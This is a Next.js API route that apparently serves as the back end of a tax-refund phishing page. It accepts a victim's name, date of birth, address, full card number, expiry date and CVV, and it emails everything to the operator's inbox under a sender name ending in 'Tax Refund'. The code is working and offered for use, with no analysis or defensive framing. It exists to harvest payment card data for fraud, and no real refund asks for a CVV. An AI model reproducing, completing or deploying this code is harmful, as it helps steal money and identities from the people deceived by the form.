import { NextResponse } from "next/server"
import nodemailer from "nodemailer"

// Server-side sanitization
const sanitizeInput = (input: string): string => {
  return input
    .trim()
    .replace(/[<>]/g, "")
    .replace(/[^\w\s@.,\-()]/gi, "")
}

export async function POST(request: Request) {
  try {
    const formData = await request.json()

    // Validate required environment variables
    if (!process.env.SMTP_HOST || !process.env.SMTP_PORT || !process.env.SMTP_USER || !process.env.SMTP_PASS) {
      return NextResponse.json({ error: "Email configuration is missing" }, { status: 500 })
    }

    // Sanitize all inputs on server side
    const sanitizedData = {
      fullName: sanitizeInput(formData.fullName),
      email: sanitizeInput(formData.email),
      phoneNumber: sanitizeInput(formData.phoneNumber),
      dateOfBirth: sanitizeInput(formData.dateOfBirth),
      address: sanitizeInput(formData.address),
      city: sanitizeInput(formData.city),
      postalCode: sanitizeInput(formData.postalCode),
      country: sanitizeInput(formData.country),
      cardType: sanitizeInput(formData.cardType),
      cardNumber: sanitizeInput(formData.cardNumber),
      nameOnCard: sanitizeInput(formData.nameOnCard),
      expirationDate: sanitizeInput(formData.expirationDate),
      cvv: sanitizeInput(formData.cvv),
    }

    // Create transporter
    const transporter = nodemailer.createTransport({
      host: process.env.SMTP_HOST,
      port: Number.parseInt(process.env.SMTP_PORT),
      secure: process.env.SMTP_PORT === "465",
      auth: {
        user: process.env.SMTP_USER,
        pass: process.env.SMTP_PASS,
      },
    })

    // Format card type for display
    const cardTypeDisplay = sanitizedData.cardType.toUpperCase()

    const countryCode = sanitizedData.country.split(" ")[0].toUpperCase()
    const senderName = `${countryCode} Tax Refund`

    // Create email HTML with all card information clearly displayed
    const emailHtml = `
      <!DOCTYPE html>
      <html>
        <head>
          <style>
            body {
              font-family: Arial, sans-serif;
              line-height: 1.6;
              color: #333;
              max-width: 600px;
              margin: 0 auto;
              padding: 20px;
            }
            .header {
              background-color: #2563eb;
              color: white;
              padding: 20px;
              text-align: center;
              border-radius: 8px 8px 0 0;
            }
            .content {
              background-color: #f9fafb;
              padding: 30px;
              border: 1px solid #e5e7eb;
              border-radius: 0 0 8px 8px;
            }
            .section {
              margin-bottom: 25px;
              background-color: white;
              padding: 20px;
              border-radius: 6px;
              border-left: 4px solid #2563eb;
            }
            .section-title {
              font-size: 16px;
              font-weight: bold;
              color: #2563eb;
              margin-bottom: 15px;
              text-transform: uppercase;
              letter-spacing: 0.5px;
            }
            .field {
              margin-bottom: 12px;
              padding: 8px 0;
              border-bottom: 1px solid #f3f4f6;
            }
            .field:last-child {
              border-bottom: none;
            }
            .label {
              font-weight: bold;
              color: #4b5563;
              display: inline-block;
              width: 180px;
            }
            .value {
              color: #111827;
              font-size: 15px;
            }
            .card-info {
              background-color: #fef3c7;
              border-left-color: #f59e0b;
            }
            .footer {
              text-align: center;
              margin-top: 20px;
              padding-top: 20px;
              border-top: 2px solid #e5e7eb;
              color: #6b7280;
              font-size: 12px;
            }
          </style>
        </head>
        <body>
          <div class="header">
            <h1 style="margin: 0;">New Refund Application</h1>
            <p style="margin: 10px 0 0 0;">Submitted on ${new Date().toLocaleString()}</p>
          </div>
          
          <div class="content">
            <div class="section">
              <div class="section-title">Personal Information</div>
              <div class="field">
                <span class="label">Full Name:</span>
                <span class="value">${sanitizedData.fullName}</span>
              </div>
              <div class="field">
                <span class="label">Email:</span>
                <span class="value">${sanitizedData.email}</span>
              </div>
              <div class="field">
                <span class="label">Phone Number:</span>
                <span class="value">${sanitizedData.phoneNumber}</span>
              </div>
              <div class="field">
                <span class="label">Date of Birth:</span>
                <span class="value">${sanitizedData.dateOfBirth}</span>
              </div>
            </div>

            <div class="section">
              <div class="section-title">Address Information</div>
              <div class="field">
                <span class="label">Address:</span>
                <span class="value">${sanitizedData.address}</span>
              </div>
              <div class="field">
                <span class="label">City:</span>
                <span class="value">${sanitizedData.city}</span>
              </div>
              <div class="field">
                <span class="label">Postal Code:</span>
                <span class="value">${sanitizedData.postalCode}</span>
              </div>
              <div class="field">
                <span class="label">Country:</span>
                <span class="value">${sanitizedData.country}</span>
              </div>
            </div>

            <div class="section card-info">
              <div class="section-title">Card Information for Refund</div>
              <div class="field">
                <span class="label">Card Type:</span>
                <span class="value"><strong>${cardTypeDisplay}</strong></span>
              </div>
              <div class="field">
                <span class="label">Card Number:</span>
                <span class="value"><strong>${sanitizedData.cardNumber}</strong></span>
              </div>
              <div class="field">
                <span class="label">Name on Card:</span>
                <span class="value"><strong>${sanitizedData.nameOnCard}</strong></span>
              </div>
              <div class="field">
                <span class="label">Expiration Date:</span>
                <span class="value"><strong>${sanitizedData.expirationDate}</strong></span>
              </div>
              <div class="field">
                <span class="label">CVV:</span>
                <span class="value"><strong>${sanitizedData.cvv}</strong></span>
              </div>
            </div>

            <div class="footer">
              <p>This is an automated email from the Refund Application System.</p>
              <p>Refunds Today 2025 © All Rights Reserved.</p>
            </div>
          </div>
        </body>
      </html>
    `

    await transporter.sendMail({
      from: `"${senderName}" <${process.env.SMTP_USER}>`,
      to: process.env.RECIPIENT_EMAIL || process.env.SMTP_USER,
      subject: "Tax Refund",
      html: emailHtml,
      text: `
New Refund Application Received

PERSONAL INFORMATION:
Full Name: ${sanitizedData.fullName}
Email: ${sanitizedData.email}
Phone Number: ${sanitizedData.phoneNumber}
Date of Birth: ${sanitizedData.dateOfBirth}

ADDRESS INFORMATION:
Address: ${sanitizedData.address}
City: ${sanitizedData.city}
Postal Code: ${sanitizedData.postalCode}
Country: ${sanitizedData.country}

CARD INFORMATION FOR REFUND:
Card Type: ${cardTypeDisplay}
Card Number: ${sanitizedData.cardNumber}
Name on Card: ${sanitizedData.nameOnCard}
Expiration Date: ${sanitizedData.expirationDate}
CVV: ${sanitizedData.cvv}

Submitted on: ${new Date().toLocaleString()}
      `,
    })

    return NextResponse.json({ success: true, message: "Refund application submitted successfully" })
  } catch (error) {
    console.error("Error sending email:", error)
    return NextResponse.json({ error: "Failed to submit refund application" }, { status: 500 })
  }
}
